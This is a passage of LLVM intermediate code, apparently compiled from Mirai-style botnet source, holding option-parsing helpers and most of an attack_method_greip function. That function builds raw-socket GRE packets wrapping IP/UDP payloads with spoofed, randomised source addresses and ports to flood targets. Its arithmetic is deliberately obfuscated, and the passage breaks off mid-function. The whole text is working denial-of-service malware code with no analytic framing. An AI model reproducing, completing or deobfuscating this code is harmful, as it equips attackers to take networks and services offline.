  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %40

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %42

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, 1
  %38 = sub i32 %36, %37
  %39 = add nsw i32 %36, 1
  store i32 %38, i32* %10, align 4
  br label %11

; <label>:40:                                     ; preds = %11
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  br label %42

; <label>:42:                                     ; preds = %40, %27
  %43 = load i8*, i8** %5, align 8
  ret i8* %43
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %560

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %560

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %329, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %336

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 15, -1
  %118 = xor i8 %116, %117
  %119 = and i8 %118, %116
  %120 = and i8 %116, 15
  %121 = xor i8 %119, -1
  %122 = xor i8 64, -1
  %123 = xor i8 -19, -1
  %124 = and i8 %121, -19
  %125 = and i8 %119, %123
  %126 = and i8 %122, -19
  %127 = and i8 64, %123
  %128 = or i8 %124, %125
  %129 = or i8 %126, %127
  %130 = xor i8 %128, %129
  %131 = or i8 %121, %122
  %132 = xor i8 %131, -1
  %133 = or i8 -19, %123
  %134 = and i8 %132, %133
  %135 = or i8 %130, %134
  %136 = or i8 %119, 64
  store i8 %135, i8* %115, align 4
  %137 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 %139, -1
  %141 = xor i8 -16, -1
  %142 = xor i8 75, -1
  %143 = or i8 %140, %141
  %144 = or i8 75, %142
  %145 = xor i8 %143, -1
  %146 = and i8 %145, %144
  %147 = and i8 %139, -16
  %148 = xor i8 %146, -1
  %149 = xor i8 5, -1
  %150 = xor i8 91, -1
  %151 = and i8 %148, 91
  %152 = and i8 %146, %150
  %153 = and i8 %149, 91
  %154 = and i8 5, %150
  %155 = or i8 %151, %152
  %156 = or i8 %153, %154
  %157 = xor i8 %155, %156
  %158 = or i8 %148, %149
  %159 = xor i8 %158, -1
  %160 = or i8 91, %150
  %161 = and i8 %159, %160
  %162 = or i8 %157, %161
  %163 = or i8 %146, 5
  store i8 %162, i8* %138, align 4
  %164 = load i8, i8* %12, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 1
  store i8 %164, i8* %166, align 1
  %167 = load i32, i32* %18, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 52, 584002076195512257
  %170 = add i64 %169, %168
  %171 = add i64 %170, 584002076195512257
  %172 = add i64 52, %168
  %173 = trunc i64 %171 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %13, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %14, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %15, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %190

; <label>:186:                                    ; preds = %93
  %187 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %188 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 4
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %186, %93
  %191 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 6
  store i8 47, i8* %192, align 1
  %193 = load i32, i32* %21, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 8
  store i32 %193, i32* %195, align 4
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 9
  store i32 %201, i32* %203, align 4
  %204 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %205 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %206 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %205, i32 0, i32 1
  store i16 %204, i16* %206, align 2
  %207 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %208 = bitcast %struct.iphdr* %207 to i8*
  %209 = load i8, i8* %208, align 4
  %210 = xor i8 15, -1
  %211 = xor i8 %209, %210
  %212 = and i8 %211, %209
  %213 = and i8 %209, 15
  %214 = and i8 %212, 64
  %215 = xor i8 %212, 64
  %216 = or i8 %214, %215
  %217 = or i8 %212, 64
  store i8 %216, i8* %208, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = bitcast %struct.iphdr* %218 to i8*
  %220 = load i8, i8* %219, align 4
  %221 = xor i8 -16, -1
  %222 = xor i8 %220, %221
  %223 = and i8 %222, %220
  %224 = and i8 %220, -16
  %225 = xor i8 %223, -1
  %226 = xor i8 5, -1
  %227 = xor i8 91, -1
  %228 = and i8 %225, 91
  %229 = and i8 %223, %227
  %230 = and i8 %226, 91
  %231 = and i8 5, %227
  %232 = or i8 %228, %229
  %233 = or i8 %230, %231
  %234 = xor i8 %232, %233
  %235 = or i8 %225, %226
  %236 = xor i8 %235, -1
  %237 = or i8 91, %227
  %238 = and i8 %236, %237
  %239 = or i8 %234, %238
  %240 = or i8 %223, 5
  store i8 %239, i8* %219, align 4
  %241 = load i8, i8* %12, align 1
  %242 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 1
  store i8 %241, i8* %243, align 1
  %244 = load i32, i32* %18, align 4
  %245 = sext i32 %244 to i64
  %246 = add i64 28, -7705135109144465918
  %247 = add i64 %246, %245
  %248 = sub i64 %247, -7705135109144465918
  %249 = add i64 28, %245
  %250 = trunc i64 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %13, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = and i32 -1, %256
  %258 = xor i32 -1, -1
  %259 = and i32 %255, %258
  %260 = or i32 %257, %259
  %261 = xor i32 %255, -1
  %262 = trunc i32 %260 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 3
  store i16 %263, i16* %265, align 4
  %266 = load i8, i8* %14, align 1
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 5
  store i8 %266, i8* %268, align 4
  %269 = load i8, i8* %15, align 1
  %270 = icmp ne i8 %269, 0
  br i1 %270, label %271, label %275

; <label>:271:                                    ; preds = %190
  %272 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 4
  store i16 %272, i16* %274, align 2
  br label %275

; <label>:275:                                    ; preds = %271, %190
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 6
  store i8 17, i8* %277, align 1
  %278 = call i32 @rand_next()
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  store i32 %278, i32* %280, align 4
  %281 = load i8, i8* %20, align 1
  %282 = icmp ne i8 %281, 0
  br i1 %282, label %283, label %289

; <label>:283:                                    ; preds = %275
  %284 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  %286 = load i32, i32* %285, align 4
  %287 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 9
  store i32 %286, i32* %288, align 4
  br label %310

; <label>:289:                                    ; preds = %275
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  %292 = load i32, i32* %291, align 4
  %293 = sub i32 %292, -873750815
  %294 = sub i32 %293, 1024
  %295 = add i32 %294, -873750815
  %296 = sub i32 %292, 1024
  %297 = xor i32 %295, -1
  %298 = and i32 -1859542332, %297
  %299 = xor i32 -1859542332, -1
  %300 = and i32 %295, %299
  %301 = xor i32 -1, -1
  %302 = and i32 %301, -1859542332
  %303 = and i32 -1, %299
  %304 = or i32 %298, %300
  %305 = or i32 %302, %303
  %306 = xor i32 %304, %305
  %307 = xor i32 %295, -1
  %308 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 9
  store i32 %306, i32* %309, align 4
  br label %310

; <label>:310:                                    ; preds = %289, %283
  %311 = load i16, i16* %16, align 2
  %312 = call zeroext i16 @htons(i16 zeroext %311) #7
  %313 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 0
  store i16 %312, i16* %314, align 2
  %315 = load i16, i16* %17, align 2
  %316 = call zeroext i16 @htons(i16 zeroext %315) #7
  %317 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 1
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = add i64 8, 3219934096212273887
  %322 = add i64 %321, %320
  %323 = sub i64 %322, 3219934096212273887
  %324 = add i64 8, %320
  %325 = trunc i64 %323 to i16
  %326 = call zeroext i16 @htons(i16 zeroext %325) #7
  %327 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %328 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %327, i32 0, i32 2
  store i16 %326, i16* %328, align 2
  br label %329

; <label>:329:                                    ; preds = %310
  %330 = load i32, i32* %9, align 4
  %331 = sub i32 0, %330
  %332 = sub i32 0, 1
  %333 = add i32 %331, %332
  %334 = sub i32 0, %333
  %335 = add nsw i32 %330, 1
  store i32 %334, i32* %9, align 4
  br label %88

; <label>:336:                                    ; preds = %88
  br label %337

; <label>:337:                                    ; preds = %559, %336
  store i32 0, i32* %9, align 4
  br label %338

; <label>:338:                                    ; preds = %554, %337
  %339 = load i32, i32* %9, align 4
  %340 = load i8, i8* %5, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp slt i32 %339, %341
  br i1 %342, label %343, label %559

; <label>:343:                                    ; preds = %338
  %344 = load i8**, i8*** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds i8*, i8** %344, i64 %346
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %26, align 8
  %349 = load i8*, i8** %26, align 8
  %350 = bitcast i8* %349 to %struct.iphdr*
  store %struct.iphdr* %350, %struct.iphdr** %27, align 8
  %351 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i64 1
  %353 = bitcast %struct.iphdr* %352 to %struct.grehdr*
  store %struct.grehdr* %353, %struct.grehdr** %28, align 8
  %354 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %355 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %354, i64 1
  %356 = bitcast %struct.grehdr* %355 to %struct.iphdr*
  store %struct.iphdr* %356, %struct.iphdr** %29, align 8
  %357 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i64 1
  %359 = bitcast %struct.iphdr* %358 to %struct.udphdr*
  store %struct.udphdr* %359, %struct.udphdr** %30, align 8
  %360 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %361 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %360, i64 1
  %362 = bitcast %struct.udphdr* %361 to i8*
  store i8* %362, i8** %31, align 8
  %363 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %364 = load i32, i32* %9, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i64 %365
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i32 0, i32 2
  %368 = load i8, i8* %367, align 4
  %369 = zext i8 %368 to i32
  %370 = icmp slt i32 %369, 32
  br i1 %370, label %371, label %394

; <label>:371:                                    ; preds = %343
  %372 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %373 = load i32, i32* %9, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %372, i64 %374
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i32 0, i32 1
  %377 = load i32, i32* %376, align 4
  %378 = call i32 @ntohl(i32 %377) #7
  %379 = call i32 @rand_next()
  %380 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %381 = load i32, i32* %9, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i32 0, i32 2
  %385 = load i8, i8* %384, align 4
  %386 = zext i8 %385 to i32
  %387 = lshr i32 %379, %386
  %388 = sub i32 0, %387
  %389 = sub i32 %378, %388
  %390 = add i32 %378, %387
  %391 = call i32 @htonl(i32 %389) #7
  %392 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %371, %343
  %395 = load i32, i32* %21, align 4
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %397, label %401

; <label>:397:                                    ; preds = %394
  %398 = call i32 @rand_next()
  %399 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 8
  store i32 %398, i32* %400, align 4
  br label %401

; <label>:401:                                    ; preds = %397, %394
  %402 = load i16, i16* %13, align 2
  %403 = zext i16 %402 to i32
  %404 = icmp eq i32 %403, 65535
  br i1 %404, label %405, label %435

; <label>:405:                                    ; preds = %401
  %406 = call i32 @rand_next()
  %407 = xor i32 65535, -1
  %408 = xor i32 %406, %407
  %409 = and i32 %408, %406
  %410 = and i32 %406, 65535
  %411 = trunc i32 %409 to i16
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 3
  store i16 %411, i16* %413, align 4
  %414 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 3
  %416 = load i16, i16* %415, align 4
  %417 = zext i16 %416 to i32
  %418 = sub i32 0, 1000
  %419 = add i32 %417, %418
  %420 = sub nsw i32 %417, 1000
  %421 = xor i32 %419, -1
  %422 = and i32 -396949156, %421
  %423 = xor i32 -396949156, -1
  %424 = and i32 %419, %423
  %425 = xor i32 -1, -1
  %426 = and i32 %425, -396949156
  %427 = and i32 -1, %423
  %428 = or i32 %422, %424
  %429 = or i32 %426, %427
  %430 = xor i32 %428, %429
  %431 = xor i32 %419, -1
  %432 = trunc i32 %430 to i16
  %433 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 3
  store i16 %432, i16* %434, align 4
  br label %435

; <label>:435:                                    ; preds = %405, %401
  %436 = load i16, i16* %16, align 2
  %437 = zext i16 %436 to i32
  %438 = icmp eq i32 %437, 65535
  br i1 %438, label %439, label %448

; <label>:439:                                    ; preds = %435
  %440 = call i32 @rand_next()
  %441 = xor i32 65535, -1
  %442 = xor i32 %440, %441
  %443 = and i32 %442, %440
  %444 = and i32 %440, 65535
  %445 = trunc i32 %443 to i16
  %446 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %447 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %446, i32 0, i32 0
  store i16 %445, i16* %447, align 2
  br label %448

; <label>:448:                                    ; preds = %439, %435
